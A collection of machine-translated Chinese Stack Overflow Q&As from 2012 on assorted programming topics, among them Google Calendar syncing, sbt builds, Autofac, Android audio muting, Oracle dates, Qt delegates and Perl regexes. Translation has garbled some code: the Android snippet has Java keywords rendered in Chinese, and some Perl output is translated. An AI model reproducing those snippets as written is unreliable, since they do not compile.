我正在为事件数据来自 Google 日历（只读）的预订系统编写 Java REST API。我目前正在尝试找出从 Google 日历获取事件数据并将其存储在 Google App Engine 的 JPA 数据存储中的最佳方法。我也有几个要求：

*   我需要保存以前的日历数据。简单地删除数据库中的所有内容并用新数据替换它是不够的，因为我想保留数据的历史视图以用于统计目的。
*   当事件数据发生变化时，我需要通知用户，特别是删除。这需要我将新事件数据（来自 API）与旧事件数据（来自 JPA 数据存储区）进行比较。

有没有人对做什么有任何一般性的指导和建议。我是否通过尝试将数据复制到数据存储中以正确的方式解决问题？我是否应该在每次需要使用数据时都发出 API 请求？如果我这样做，有没有办法启动一些邮件服务，直接在 Google 日历中通知用户事件更改？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-29T22:37:46.743

我认为尝试在数据存储中复制每个事件的信息将是次优的。如果您想要*一切*，那么您最终将存储大量数据，我怀疑其中大部分将毫无用处。

如果您想存储数据以进行统计分析，我建议您确定要跟踪的最小字段集是什么，然后存储它们。一组合理的字段可能是：事件 ID、名称、时间、参加者、位置、描述和用于簿记目的的内部版本号。每次字段更改时增加版本号，并保存新的字段信息。如果最近检索到的条目的哈希值与已保存的哈希值匹配，您可以保存字段的哈希值，而不是保存新版本。

由于您不再将整个事件存储在服务器上，因此在需要事件详细信息时是否直接查询 API 的问题显然是“是”。

Google 日历会在创建或更改日历事件时提供电子邮件通知。如果您担心用户会收到有关其日历上出现的新事件的通知，可以通过将`sendNotifications`字段（在[插入新事件](https://developers.google.com/google-apps/calendar/v3/reference/events/insert)的调用中）设置为 来轻松解决`true`。API 中的更新和删除调用（以及用户修改事件时的日历 UI）中存在类似的功能。

我在这个实现中看到的最困难的部分是决定您的应用程序如何在用户进行修改时确定事件何时发生变化。（您的代码所做的更改可以立即反映在您保存在数据存储中的数据中。）如果所有事件都出现在一个日历上，您可以轮询 API 以获取[事件列表](https://developers.google.com/google-apps/calendar/v3/reference/events/list)，并使用`updatedMin`您的时间字段最后查询更新。如果事件在多个日历上，方法是相同的，但您需要为每个日历做一个列表。

请注意，您向应用程序提供的任何凭据都需要能够读取和写入您正在修改的任何日历。作为初始方法，我建议您为您的应用程序创建一个主日历，将其列为您正在跟踪的所有事件的参与者。您代表用户创建的活动会将用户列为与会者。用户创建并希望与您的应用程序关联的事件需要将主日历添加为参与者。最后一点可能需要管理用户以正确的方式与系统交互进行一些培训。

上述方法的替代方法是让所有用户将其日历的访问权限委托给您的应用程序，但您必须管理多组凭据，并可能清除用户日历上您不感兴趣跟踪的任何事件。

# java - 在多模块 Java/scala 项目中有一个通用的 webapp？

> ID：10757930
> 
> 赞同：3
> 
> 时间：2012-05-25T16:14:36.710
> 
> 标签：java, scala, maven, sbt

我正在使用 SBT/scala，但这个问题也适用于 Maven/Java 项目，因为 SBT 基于 Maven 结构。

我想设置一个共享通用 webapp 部署的多模块应用程序。我应该如何在 Maven/SBT 中构建我的项目并在打包步骤中使用 webapp？

结构体

```
sharedlibrary/
   webapp/
module1
module2
module3 
```

所以当我打包module1（取决于sharedlibrary）时，我希望webapp包含在最终的war文件中。webapp 将有代码根据它启动的服务器加载正确的 Module1 Main 类。在 maven/sbt 中以一种简单的方式可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-26T15:56:21.807

我对 sbt 的复杂性不是很熟悉，但我最近开始建立一个有点类似的项目。这是我首先针对您的情况尝试的方法。

1）在与您的模块*文件夹相同的级别上创建一个“项目”子目录。

2）创建一个新文件“project/Build.scala”，内容如下。请务必将`destPath`值更改为您需要的目录名称。此示例中的路径设置为使用`war`每个*模块*中的文件夹与 Google App Engine 一起使用。

```
import sbt._
import Keys._

object MyBuild extends Build {
  lazy val copyDependencies = TaskKey[Unit]("copy-dependencies")
  def copyDepTask = copyDependencies <<= {
    (dependencyClasspath in Runtime, baseDirectory) map { (dep, bp) => 
    for (attrSrcPath <- dep) {
      val srcPath = attrSrcPath.data
      println(srcPath);
      if (!srcPath.isDirectory) {
        val destPath = bp / "war/WEB-INF/lib" / srcPath.getName
        IO.copyFile(srcPath, destPath, preserveLastModified=true)
      }
      else {
        val destPath = bp / "war/WEB-INF/classes/"
        IO.copyDirectory(srcPath, destPath, preserveLastModified=true)
      }
    }
  }

  lazy val webapp = Project("webapp", file("sharedlibrary/webapp"))
  lazy val module1 = Project("module1", file("module1"),
      settings = Project.defaultSettings ++ Seq(copyDepTask)
    ) dependsOn(webapp)
  lazy val module2 = Project("module2", file("module2"),
      settings = Project.defaultSettings ++ Seq(copyDepTask)
    ) dependsOn(webapp)
  lazy val module3 = Project("module3", file("module3"),
      settings = Project.defaultSettings ++ Seq(copyDepTask)
    ) dependsOn(webapp)
} 
```

3）在 sbt 中，您可以输入`project module1`and `copy-dependencies`，并且 sbt 会将类文件从*webapp*复制到*module1*和依赖的`war/WEB-INF/classes`jar 到`war/WEB-INF/lib`.

对于 Google App Engine，我在运行开发服务器或将项目上传到 apppot 之前执行此操作，并且它运行良好，尽管有朝一日能自动化该过程会更好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-26T07:27:16.183

是的

参见 SBT 多项目：

> [https://github.com/harrah/xsbt/wiki/Getting-Started-Multi-Project](https://github.com/harrah/xsbt/wiki/Getting-Started-Multi-Project)

和 sbt-assembly 插件：

> [https://github.com/sbt/sbt-assembly](https://github.com/sbt/sbt-assembly)

# c# - 如何在 Asp.Net（不是 MVC）中向 Autofac 注册 HttpContextBase

> ID：10757932
> 
> 赞同：7
> 
> 时间：2012-05-25T16:14:42.233
> 
> 标签：c#, asp.net, autofac

这是一个运行 .Net 3.5 的 Asp.net 应用程序（不是 MVC）

我这样做了：

```
 protected void Application_Start(object sender, EventArgs e)
 {

 ...

       builder.Register(c => new HttpContextWrapper(HttpContext.Current))
          .As<HttpContextBase>()
          .InstancePerHttpRequest();
 } 
```

但它不起作用。

我得到这个错误：

**从请求实例的范围中看不到具有与“httpRequest”匹配的标记的范围。这通常表明注册为 per-HTTP 请求的组件正在被 SingleInstance() 组件（或类似场景）请求。在 Web 集成下，始终从 DependencyResolver.Current 或 ILifetimeScopeProvider.RequestLifetime 请求依赖项，而不是从容器本身.**

然后我发现了这个：[https ://stackoverflow.com/a/7821781/305469](https://stackoverflow.com/a/7821781/305469)

而我这样做了：

```
 builder.Register(c => new HttpContextWrapper(HttpContext.Current))
          .As<HttpContextBase>()
          .InstancePerLifetimeScope(); 
```

但是现在当我这样做时：

```
public class HttpService : IHttpService
{
    private readonly HttpContextBase context;

    public HttpService(HttpContextBase context)
    {
        this.context = context;
    }

    public void ResponseRedirect(string url)
    {
        //Throws null ref exception
        context.Response.Redirect(url);
    }
} 
```

我得到了一个空引用异常。

奇怪的是， context.Response 不为空，它是在我调用 .Redirect() 时抛出的。

我想知道是否使用 .InstancePerLifetimeScope(); 是问题所在。

顺便说一句，我尝试使用 Response.Redirect() 并且效果很好。

那么可能是什么问题呢？

谢谢，

志

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-01T15:06:41.187

看起来您的`HttpService`类可能已注册为`SingleInstance()`（单例）组件。或者，具有`IHttpService`作为依赖项的类之一是单例。

发生这种情况时，即使您已将 Autofac 设置为`HttpContextBase`每个 HTTP 请求（或生命周期范围，这也是正确的）返回一个新实例，`HttpService`该类仍将挂在创建单个实例`HttpContextBase`时的任何当前实例。`HttpService`

`HttpContextBase`要测试这个理论，请尝试直接从页面中获取依赖项，并查看问题是否仍然存在。如果是这样，找出哪个是单例组件应该相当简单。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-28T10:56:48.047

使用生命周期注册 HttpContextWrapper 就像使用 RegisterInstance() 一样，也就是说，您将始终使用同一个 HttContextWrapper 实例。因此，第二个请求将使用第一个请求的 HttpContext，从而导致一些奇怪的错误。

可能的解决方法：为 HttpContext 创建自己的包装器，并在实例生命周期中注册它，并让它在内部使用当前的 HttpContext：

```
public interface IMyWrapper
{
    void ResponseRedirect(string url);
}

public class MyWrapper : IMyWrapper
{
    public void ResponseRedirect(string url)
    {
        HttpContext.Current.Response.Redirect(url);
    }
}

builder.Register(c => new MyWrapper())
    .As<IWrapper>()
    .InstancePerLifetimeScope(); 
```

不过，这样你就不会注入 HttpContext。不知道这是否重要...

# javascript - 如何在 jQuery 中使用 str.search() 或类似方法处理条件？

> ID：10757934
> 
> 赞同：2
> 
> 时间：2012-05-25T16:14:55.657
> 
> 标签：javascript, window.location

我正在制作一个脚本来过滤带有复选框的wordpress中的帖子列表，它应该做的是最初抓取地址栏中的链接（window.location）并使用它并设置条件来知道哪些复选框是活动的与否，提交的第二部分将正确的链接发送到 window.location 以便根据用户的选择进行相应的过滤.....我被困在我想检查窗口的部分。定义选中/未选中的位置，但我很难在 if 上使用`str.search()`or或 other：`str.match()`

尝试使用 javascript 中的所有字符串对象方法：

```
var str=window.location;
var res=str.search("example");

if (res!=null) { alert(res) } 
```

我想检查地址栏中是否存在“示例”一词，以了解类别或标签是否处于活动状态，围绕这个小细节 oO 已经有几天了

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:16:44.900

```
var str = window.location.href;

var res = str.indexOf('example'); // return position of first match or -1
if(res != -1) {
   alert(res);
} 
```

或者

```
var res = /example/.test(str); // return true of false
if(res) {
  alert(res);
} 
```

如果你想获得哈希值，那么你应该使用

```
var str = window.location.hash; 
```

然后应用上述任何内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:24:02.790

```
var searchString = "example";
if (window.location.href.search(searchString) != -1) alert(searchString); 
```

[小提琴](http://jsfiddle.net/adeneo/cSGre/)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-25T16:18:49.767

您可能想调查 location.hash

# javascript - JavaScript本地应用程序保存/加载文件？

> ID：10757937
> 
> 赞同：2
> 
> 时间：2012-05-25T16:15:01.657
> 
> 标签：javascript, file, load, save

我正在为一个插件构建一个 GUI，它在本地运行在 Firefox 中。有没有办法将对象的 .data 保存到 .js 或 .txt 文件中，然后能够加载这些保存的文件（其中只包含用户添加的元素数量及其关联的数据）？我在其他地方读过它，似乎无法得到一个可靠的答案。如果这不可能，是否有解决方法？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-25T14:35:06.197

从 html5 开始，您可以使用 LocalStorage API。现在几乎所有的浏览器都支持它：

```
// Check if it is supported in your browser
function supports_html5_storage()
{
      try
      {
        return 'localStorage' in window && window['localStorage'] !== null;
      }
      catch (e)
      {
        return false;
      }
}

//make use of it:
if( supports_html5_storage() == true )
{
   localStorage.setItem("myItem", "myData");
   var myDataString = localStorage.getItem("myItem");
   alert(myDataString);
} 
```

# android - 如何在我的 Android 应用程序中关闭物理按钮的声音点击（音效）？

> ID：10757942
> 
> 赞同：4
> 
> 时间：2012-05-25T16:15:19.813
> 
> 标签：android, button

我正在开发一个 Android 应用程序，允许用户将手放在设备上，并且我想禁用物理按钮，这样用户就不会因不必要的点击而烦恼。

我已经禁用了**back**，**menu**和**search**按钮，如下所示：

```
@覆盖
公共无效 onBackPressed() {}

@覆盖
public boolean onPrepareOptionsMenu(Menu menu) {return false;}

@覆盖
公共布尔 onSearchRequested() {return false;}

```

而且我了解到禁用**主页**键是不受支持和/或不建议的（尽管我希望这样做）。

好的，现在我不知道如何禁用我已禁用的键的点击声音，它们除了不断滴答声什么都不做，有没有办法关闭它？

我只想为我的应用程序**静音。**如果不可能，我想知道以编程方式更改系统设置的替代方案，以便稍后在关闭或焦点更改时恢复它。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-25T17:17:10.050

您可以在应用启动时静音，并在应用完成时取消静音

```
@override
public void onResume(){
    super.onResume();
    AudioManager mgr = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
    mgr.setStreamMute(AudioManager.STREAM_SYSTEM, true);
}

@override
public void onPause(){
    super.onPause();
    AudioManager mgr = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
    mgr.setStreamMute(AudioManager.STREAM_SYSTEM, false);
} 
```

# sql - Oracle 日期以毫秒为单位的四舍五入

> ID：10757944
> 
> 赞同：1
> 
> 时间：2012-05-25T16:15:28.870
> 
> 标签：sql, oracle

Oracle DB 如何在其日期函数中舍入毫秒？

例如，如果`sysdate`恰好在“05/25/2012 01:15:25.900”运行，则日期将存储为“05/25/2012 01:15:26”（向上舍入）还是“05/25/2012” 01:15:25"（四舍五入）？

它是否对超过半毫秒的所有内容进行四舍五入，对低于半毫秒的所有内容进行向下取整？

这是我放在一起的一个简单测试：

```
SELECT to_char(systimestamp, 'dd-mm-yyyy hh:mi:ss:ff') as sys_time_stamp,
to_char(
     TO_DATE (
         TO_CHAR (SYSTIMESTAMP, 'YYYY-MON-DD HH24:MI:SS'),
         'YYYY-MON-DD HH24:MI:SS'), 
     'dd-mm-yyy hh:mi:ss') as sys_date
FROM DUAL; 
```

运行 1
sys_time_stamp：25-05-2012 12:37:32:798000
sys_date：25-05-012 12:37:32

运行 2
sys_time_stamp：25-05-2012 12:43:41:322000
sys_date：25-05-012 12:43:41

这表明至少在将 a 转换`systimestamp`为 a时`date`，毫秒数会被丢弃。但是当`sysdate`实际生成时，毫秒实际上只是被丢弃了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T20:54:18.070

将时间的分数向上取整会导致 sysdate 平均快半秒。

它将在 23:59:59.500 翻转到第二天。

这显然是愚蠢的，所以我将使用截断而不是四舍五入。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T19:02:05.537

由于 Oracle`DATE`仅将日期存储到秒并且`SYSDATE`依赖于底层操作系统的时钟，所以我希望结果取决于操作系统。Oracle 只是在向操作系统询问“第二个日期是什么时候”`SYSDATE`以及“你所拥有的最精确的日期是什么时候” `SYSTIMESTAMP`。由于该调用本质上是依赖于操作系统的，并且文档中没有另外指定行为，我希望不同的操作系统会或至少可能有不同的实现（从技术上讲，更可能是数据库内核是 C 库在每个操作系统上编译）。

我强烈怀疑 Oracle 内核只是调用[C 时间函数](http://www.cplusplus.com/reference/clibrary/ctime/time/)和[C gettimeofday 函数](http://www.gnu.org/software/libc/manual/html_node/High_002dResolution-Calendar.html)`SYSDATE`，所以无论库实现是什么，你都会得到。`SYSTIMESTAMP`

# ruby-on-rails - 在 ubuntu 上以 root 身份运行的延迟作业进程

> ID：10757948
> 
> 赞同：1
> 
> 时间：2012-05-25T16:15:46.973
> 
> 标签：ruby-on-rails, linux, delayed-job, file-permissions

我有一个 Rails 站点，它使用[Delayed Job Gem](https://github.com/collectiveidea/delayed_job)来运行后台任务。后台任务获取 PDF 并将其转换为一系列图像。

Rails 应用程序以“nobody”身份运行，延迟的作业流程以“root”身份运行。

后台任务运行正常，但是当 Rails 应用程序尝试删除由延迟作业进程创建的文件时出现问题：我收到“权限被拒绝”消息。所以'nobody'不能删除'root'创建的文件。

如果我将文件/文件夹权限设置为：

```
 chmod -R 755 
```

但这不会影响新文件。

我正在 root 帐户下使用 Capistrano 部署我的 Rails 应用程序。

作为 linux 系统管理员，我是个菜鸟。你能建议我哪里出错了吗？

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T17:09:42.270

delay_job 提供了自己的 Capistrano 配方，应该能够使用与您的应用相同的用户来启动/停止服务器。你基本上只需要`require "delayed/recipes"`在你的`deploy.rb`文件中。`cap delayed_job:start`然后您可以使用和远程启动/停止延迟作业`cap delayed_job:stop`。

[有关维基的](https://github.com/collectiveidea/delayed_job/wiki/Rails-3-and-Capistrano)更多信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-01T13:45:04.787

所以我按照水手的建议解决了我的问题：基本上设置一个新用户来运行应用程序和部署。不确定这是否对其他人有用，但这是我将网站转移给其他用户的方式：

脚步

1.  创建一个名为“www”的新用户

    ```
    useradd -d /home/www -m
    passwd www 
    ```

2.  让 www 控制现有文件：

    ```
    cd /path/to/site
    chmod -R g+ws *
    chgrp -R www * 
    ```

3.  杀死根帐户下现有的延迟作业进程

4.  更新了站点虚拟主机以告诉乘客以哪个用户身份运行

    ```
    PassengerDefaultUser  www 
    ```

5.  告诉 cap 在 deploy.rb 中使用用户 www 进行部署

    ```
    set :user, "www" 
    ```

现在延迟的工作流程和站点流程以“www”运行，这解决了我的问题。

# c# - 您如何在 .NET 中表示 BC 日期？

> ID：10757949
> 
> 赞同：4
> 
> 时间：2012-05-25T16:15:49.327
> 
> 标签：c#, .net, datetime

> **可能重复：**
> [在 C#/.NET 中处理基督之前的日期的（最佳）方法是什么？](https://stackoverflow.com/questions/877366/what-is-the-best-way-to-handle-dates-before-christ-in-c-net)

在 .NET 中如何表示 BC 日期？DateTime 结构仅支持从公元 1 年开始的日期。

# iphone - 发布到 Google+（Google+）

> ID：10757950
> 
> 赞同：9
> 
> 时间：2012-05-25T16:16:05.597
> 
> 标签：iphone, objective-c, ios, google-plus

有没有人知道如何使用 iOS 应用程序在 Google+ 流中发布内容？我到处阅读无法编辑的内容——我们只能阅读帖子。

有人可以证实这一点吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T18:14:39.843

您可以使用官方的 Google+ 分享链接，现在可以在此处获得： [https ://developers.google.com/+/plugins/share/#sharelink](https://developers.google.com/+/plugins/share/#sharelink)

示例用法：

> [https://plus.google.com/share?url=http://stackoverflow.com](https://plus.google.com/share?url=http://stackoverflow.com)

# qt - 如何使用 QStyledItemDelegate 绘制不同的背景？

> ID：10757951
> 
> 赞同：3
> 
> 时间：2012-05-25T16:16:06.850
> 
> 标签：qt, qt4, qstyleditemdelegate

**问题**：

*   我有`QTreeView`对象，还有一个`QStandardItemModel`作为模型来查看小部件；
*   对于某些项目，我使用`setData`方法设置数据以使用参数拆分它们；
*   所以我需要为项目绘制**不同**的背景**像素图**`QStandardItem`，其中包含图标和一些文本数据；
*   并且**不想**重绘所有项目对象，我的意思是图标和文本。只是改变背景。

首先，我在想：

*   `Qt Designer`我可以为具有 2 个不同背景图片的对象设置 CSS 样式表，**但** `QStandardItem` **没有** `setProperty`方法...

例子：

```
QTreeView#treeView::item[ROLE="AAA"],
QTreeView#treeView::branch[ROLE="AAA"]
{
    height: 25px;
    border: none;
    color: #564f5b;
    background-image: url(:/backgrounds/images/row1.png);
    background-position: top left;
}

QTreeView#treeView::item[ROLE="BBB"],
QTreeView#treeView::branch[ROLE="BBB"]
{
    height: 25px;
    border: none;
    color: #564f5b;
    background-image: url(:/backgrounds/images/row2.png);
    background-position: top left;
} 
```

*   然后我创建了自己的委托，从`QStyledItemDelegate`类继承并重新实现`paint`方法，**但是**我不能只更改背景，因为`QStyledItemDelegate::paint( painter, opt, index );`代码会透支我的`drawPixmap`...

例子：

```
QStyleOptionViewItemV4 opt = option; // Для обхода QTBUG-4310
opt.state &= ~QStyle::State_HasFocus; // Чтобы не рисовался прямоугольник фокуса 

QStyledItemDelegate::paint( painter, opt, index );    

// HERE I WANT TO CHANGE BACKGROUND (DEFAULT IS ALREADY SET IN DESIGNER WITH ABOVE CODE)
if( index.data( SORT_ROLE ).toBool() )
{
    const QPixmap pixmap( ":/backgrounds/images/backgrounds/contractor_row__high_priority.png" );
    painter->drawPixmap( option.rect, pixmap, pixmap.rect() );

    QStyledItemDelegate::paint( painter, opt, index );
} 
```

所以我被困住了...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-28T12:23:31.177

这是我的窍门：

的`Designer`样式表部分：

```
QTreeView#treeView
{
    border: none;
    background-color:#f0f0f1;
}   

QTreeView#treeView::item,
QTreeView#treeView::branch
{
    height: 25px;
    border: none;
    color: #564f5b;
}

QTreeView#treeView::item:selected,
QTreeView#treeView::branch:selected
{
    border-bottom: none;
    color: #ffffff;    
    background-image: url(:/backgrounds/images/backgrounds/kontragents_row_selection.png);
    background-position: top left;  

}

QTreeView#treeView::item:selected:!active,
QTreeView#treeView::branch:selected:!active
{
    color: #ffffff;
} 
```

委托重新实现的`paint()`方法：

```
void paint( QPainter* painter, const QStyleOptionViewItem& option, const QModelIndex& index ) const
 {
      QStyleOptionViewItemV4 opt = option; // Для обхода QTBUG-4310
      opt.state &= ~QStyle::State_HasFocus; // Чтобы не рисовался прямоугольник фокуса

      QBrush brush = opt.backgroundBrush;
      brush.setTexture( QPixmap( index.data( SORT_ROLE ).toBool()
           ? BACKGROUND_HIGH_PRIORITY
           : BACKGROUND_STANDARD ) );

      // FILL BACKGROUND     
      painter->save();
      painter->fillRect( opt.rect, brush );
      painter->restore();

      // DRAW ICON & TEXT
      QStyledItemDelegate::paint( painter, opt, index );

      // IF ( CHILD ) THEN PAINT OVER ONLY! BRANCH RECT
      bool isIndexParent = !index.parent().isValid();
      if( !isIndexParent )
      {
           QRect rect( 0, opt.rect.y(), 20, opt.rect.height() );

           if( opt.state & QStyle::State_Selected )
           {
                brush.setTexture( QPixmap( BACKGROUND_SELECTED ) );
           }

           painter->save();
           painter->fillRect( rect, brush );
           painter->restore();
      }
 } 
```

结果`QTreeView`视图：

![在此处输入图像描述](../Images/309a0f639c2620bbb3fd6adf3c429de5.png)

祝你今天过得愉快！:)

PS：无需重绘图标、文字、选择...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:31:52.007

委托的绘制方法是全有或全无，因此您将无法将背景与默认实现混合。

但是，如果您有足够的能力甚至可以考虑编写自定义委托，那么实现一个可以绘制背景以及图标和文本的委托应该没有问题。

# java - 在没有 GWT 的情况下将 Javascript 对象转换为 Java

> ID：10757952
> 
> 赞同：2
> 
> 时间：2012-05-25T16:16:10.507
> 
> 标签：java, javascript, scripting

> **可能重复：**
> [将 JSON 字符串转换为 Java 中的对象？](https://stackoverflow.com/questions/1395551/convert-a-json-string-to-object-in-java)

我正在为用 Java 编写的视频游戏编写脚本实现。

我有兴趣能够定义一个 javascript 对象，例如：

```
var obj = ({
    x: 1,
    a: "meh",
    onEvent: function(info) {
       //do stuff
    }
}); 
```

并通过确定的管道将其传递到 Java 领域。目前，在 Java 中，我将对象作为 sun.org.mozilla.javasript.internal.NativeObject 接收，它看起来不太可用。有什么方法可以将 javascript 传输到可以访问其中数据的 Java 对象中？具体来说，不使用 GWT，因为我并没有真正使用 Web 技术。

为清楚起见进行编辑：我没有将 Javascript 代码字符串传递给 Java 函数 ala JSON。我正在使用 javax.script 包来评估整个脚本。在脚本引擎中，我想将我的 javascript 对象作为参数传递给 Java 对象。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T17:19:32.467

我没有做太多的工作，但是 TFM 的例子似乎并不难。不确定您已经尝试过什么，但无论如何：

```
public static void main(String[] args) throws Exception {
    ScriptEngineManager manager = new ScriptEngineManager();
    ScriptEngine engine = manager.getEngineByName("JavaScript");

    // JavaScript code in a String. This code defines a script object 'obj'
    // with one method called 'hello'.        
    String script = "var obj = new Object(); obj.hello = function(name) { print('Hello, ' + name); }";
    // evaluate script
    engine.eval(script);

    // javax.script.Invocable is an optional interface.
    // Check whether your script engine implements or not!
    // Note that the JavaScript engine implements Invocable interface.
    Invocable inv = (Invocable) engine;

    // get script object on which we want to call the method
    Object obj = engine.get("obj");    // <---- THIS IS A JAVA.LANG.OBJECT

    // invoke the method named "hello" on the script object "obj"
    inv.invokeMethod(obj, "hello", "Script Method !!" );
} 
```

# perl - 如何使用 perl 正则表达式遍历数组以查找多个模式？

> ID：10757963
> 
> 赞同：2
> 
> 时间：2012-05-25T16:17:14.480
> 
> 标签：perl

我试图在一个数组中找到两个模式并将结果放入另一个数组中。

例如

```
 $/ = "__Data__";

  __Data__
  #SCSI_test         # put this line into  @arrayNewLines      
  kdkdkdkdkdkdkdkd
  dkdkdkdkdkdkdkdkd
  - ccccccccccccccc  # put this line into @arrayNewLines 
```

代码

```
 while(<FILEREAD>)
    {
          chomp;
          my @arrayOld = split(\n,@array);

          foreach my $i (0 .. $#arrayOld)
          {
                if($arrayOld[$i] =~ /^-(.*)/g or /\#(.*)/g)
                {
                     my @arrayNewLines = $arrayOld[$i];
                     print "@arrayNewLines\n";
                }
          }
    } 
```

此代码仅打印出 ccccccccccccccc 但我希望它输出 ccccccccccccccc #SCSI_test

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T17:48:30.753

该代码不只是打印`cccccc...`，它会打印所有内容。你的问题是这一行：

```
if($arrayOld[$i] =~ /^-(.*)/g or /\#(.*)/g) { 
```

你在这里做的是先检查`$arrayOld[$i]`然后检查`$_`，因为`/\#(.*)/`它是 perl 的简写`$_ =~ /\#(.*)/`。由于该行包含一个哈希字符`#`，它将始终匹配，并且该行将始终打印。

您的行相当于：

```
if(   $arrayOld[$i] =~ /^-(.*)/g 
      or 
      $_ =~ /\#(.*)/g) { 
```

答案是加入正则表达式：

```
if($arrayOld[$i] =~ /^-|#/) { 
```

但是，在那之后您的代码远非干净......从顶部开始：

如果将输入记录分隔符设置`$/`为该`__Data__`输入，您将获得两条记录（[Data::Dumper](http://search.cpan.org/perldoc?Data%3a%3aDumper)输出如下所示）：

```
$VAR1 = '__Data__';
$VAR1 = '
#SCSI_test         # put this line into  @arrayNewLines
kdkdkdkdkdkdkdkd
dkdkdkdkdkdkdkdkd
- ccccccccccccccc  # put this line into @arrayNewLines
'; 
```

当您`chomp`记录时，您将从末尾删除`__Data__`，因此第一行将变为空。因此，从本质上讲，您将始终拥有一个领先的空白字段。这没什么可怕的，但要记住的事情。

你的`split`说法是错误的。首先，第一个参数应该是一个正则表达式：`/\n/`。第二个参数应该是一个标量，而不是一个数组。`split(/\n/,@array)`将评估为`split(/\n/, 2)`，因为该数组在标量上下文中并返回其大小而不是其元素。

此外，当然，由于您正在循环读取`FILEREAD`句柄中的行，因此该`@array`数组将始终包含相同的数据，并且与文件句柄中的数据无关。你想要的是：`split /\n/, $_`.

这个循环：

```
foreach my $i (0 .. $#arrayOld) { 
```

对于这个问题，不是一个很好的循环结构。此外，不需要使用中间数组。只需使用：

```
for my $line (split /\n/, $_) { 
```

当你这样做

```
my @arrayNewLines = $arrayOld[$i];
print "@arrayNewLines\n"; 
```

您将整个数组设置为标量，然后打印它，这完全是多余的。您只需直接打印标量即可获得相同的效果。

您的代码应如下所示：

```
while(<FILEREAD>) {
    chomp;
    foreach my $line (split /\n/, $_) {
        if($line =~ /^-|#/) {
            print "$line\n";
        }
    }
} 
```

还建议您使用词法文件句柄，因此而不是

```
open FILEREAD, "somefile" or die $!;       # read with <FILEREAD> 
```

采用：

```
open my $fh, "<", "somefile" or die $!;    # read with <$fh> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:24:02.857

```
#! /usr/bin/env perl

use strict;
use warnings;

*ARGV = *DATA;

my @arrayNewLines;

while (<>) {
  chomp;

  if (/^-(.*)/ || /\#(.*)/) {
    push @arrayNewLines, $_;
  }
}

print "$_\n" for @arrayNewLines;

__DATA__
#SCSI_test         # put this line into  @arrayNewLines
kdkdkdkdkdkdkdkd
dkdkdkdkdkdkdkdkd
- ccccccccccccccc  # put this line into @arrayNewLines 
```

更好的是，如果您有 5.10 或更高版本，请使用智能匹配。

```
#! /usr/bin/env perl

use strict;
use warnings;

use 5.10.0;  # for smart matching

*ARGV = *DATA;

my @arrayNewLines;

my @patterns = (qr/^-(.*)/, qr/\#(.*)/);

while (<>) {
  chomp;
  push @arrayNewLines, $_ if $_ ~~ @patterns;
}

print "$_\n" for @arrayNewLines;

__DATA__
#SCSI_test         # put this line into  @arrayNewLines
kdkdkdkdkdkdkdkd
dkdkdkdkdkdkdkdkd
- ccccccccccccccc  # put this line into @arrayNewLines 
```

无论哪种方式，输出都是

```
#SCSI_test # 将此行放入@arrayNewLines
- ccccccccccccccc # 将此行放入@arrayNewLines
```

# c++ - 移位以将整数乘以 10

> ID：10757966
> 
> 赞同：17
> 
> 时间：2012-05-25T16:17:26.567
> 
> 标签：c++, bit-manipulation

简单的问题，但我似乎无法弄清楚：

如果我有一个整数，比如 12，我对它执行以下位操作：

```
int i = 12;  
i = (i << 3) + (i << 1); 
```

我最终得到 120 (12*10)。这是任何数字的情况。

有人可以简明扼要地向我解释一下，为什么这是有效的？（在位移方面，我显然遗漏了一些非常基本的东西）。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-05-25T16:19:41.870

Express as multiplication.

```
i = (i << 3) + (i << 1);
i = (i * 8) + (i * 2);
i = 8i + 2i
i = 10i 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-25T16:19:29.943

You are basically doing:

```
i = i*2^3 + i*2 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-25T16:21:24.117

`i << 3`相当于`i * 8`。`i << 1`相当于`i * 2`。

[分发属性](http://en.wikipedia.org/wiki/Distributive_property)告诉我们：

```
x = i * 10
x = i * (8 + 2)
x = 8i + 2i 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-25T16:20:26.190

向左移动 3 位等于乘以 8，移动 1 位等于乘以 2，所以你正在做

```
i = i * 8 + i * 2 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-25T16:24:06.050

左位移（通常）与乘以 2 的幂相同。ie`<< 1`等价于`*(2^1)`,`<< 2`等价于`*(2^2)`等等...

如果您将其代入示例中，您可以看到为什么您的结果乘以 10：

```
int i = 12;
i = (i * 2^3) + (i * 2^1);
= { i = (i * 8) + (i * 2);}
= { i = 8i + 2i; }
= { i = 10i; } 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-25T16:19:57.723

Rewrite the bitshifts as multiplications by powers-of-2, and all should become clear.

# php - PHP 按名称排序函数，从 filemtime 更改

> ID：10757972
> 
> 赞同：1
> 
> 时间：2012-05-25T16:17:54.290
> 
> 标签：php, sorting

